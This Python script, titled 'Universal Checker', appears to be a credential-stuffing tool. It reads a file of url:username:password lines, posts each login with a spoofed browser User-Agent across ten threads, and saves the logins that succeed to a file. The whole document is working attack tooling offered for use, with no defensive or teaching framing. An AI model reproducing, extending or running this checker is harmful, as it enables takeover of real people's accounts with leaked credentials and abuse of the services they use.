import requests
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor

def validate_login(url, username, password):
    data = {
        "username": username,
        "password": password
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    try:
        response = requests.post(url, data=data, headers=headers)

        if response.status_code == 200 and "success" in response.text.lower():
            return True
        elif response.status_code in [400, 401, 403]:
            return False
    except requests.RequestException as e:
        print(f"{Fore.RED}There is an error: {e}{Style.RESET_ALL}")

    return None

def process_account(account):
    account = account.strip()

    if account.startswith("https://") and account.count(':') >= 2:
        try:
            url_end_idx = account.find(':', account.find(':') + 1)
            url = account[:url_end_idx]
            credentials = account[url_end_idx + 1:]
            username, password = credentials.split(':', 1)

            result = validate_login(url, username, password)
            if result is True:
                print(f"{Fore.GREEN}Login Successful: {url}:{username}:{password}{Style.RESET_ALL}")
                with open("sukses_login.txt", "a") as success_file:
                    success_file.write(f"{url}:{username}:{password}\n")
            elif result is False:
                print(f"{Fore.LIGHTBLUE_EX}Login Failed: {url}:{username}:{password}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}An Error Occurred While Processing Account: {url}:{username}:{password}{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Invalid Format: {account}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Invalid Format: {account}{Style.RESET_ALL}")

def main():
    print(f"{Fore.BLUE}{Style.BRIGHT}")
    print("""\033[1;36m
                                         Universal Checker
                                           .-=++*****++=-.
                                       -*%%@@@@@@%*==::-=*##+:
                                    -##=:.#@@@@@@*+:#@#*-   .=**:
                                  =*=    #@@@@@@@@@@@@%:        -+=
                                :*:    .%@@@@@@@@@@@@+            .=:
                               --      .@@@@@@@@@@@#:               .-
                              :         *#@@@+:.  .+                  :
                             .          . %@@   -  ..:                 .
                                          .=+=:=-      -
  ---   ---   :--    --.   :--.  ---   .--.  -------:   -------.     :===-:.     .--:      ---
  @@*   %@*   -@@@=  #@    =@@.  -@@-  +@*   %@%=====   +@@==+@@-   %@%==+#:     #@@@:     *@%
  @@*   %@*   -@#%@%-%@    =@@.   =@@:=@#    %@@###.    +@@==*@%:   -%@@#*-     #@--@@:    *@%
  %@#  .%@*   -@+ -%@@@    =@@.    =@@@#     %@#...     +@@-*@@:    =:.:=@@*   #@@**@@@:   *@%
  :#%@@@%+.   =%+   +%%    =%%.     +%#      #%%%%%%+   +%%  +%%-   ##%@@@#:  +%*....*%#.  *%%%%%%+

                                                      -#@@@@@@@@@@:
                             .                         .@@@@@@@%*-     .
                              :                        =@@@@@@=       :
                               -:                      @@@@#=       .-
                                :+.                   %@*=.       .=:
                                  =*-                :%:        :+=
                                    -**=.                   .-++:
                                       -*##+=-:.     .:-=+##+-
                                           :-=+**###**+=-:
""")
    print(Style.RESET_ALL)

    file_name = input("Enter File Name (.txt): ").strip()

    try:
        with open(file_name, 'r') as file:
            accounts = file.readlines()

        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(process_account, accounts)

    except FileNotFoundError:
        print(f"{Fore.RED}File {file_name} Not found.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}There is an error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    from colorama import init
    init(autoreset=True)
    main()
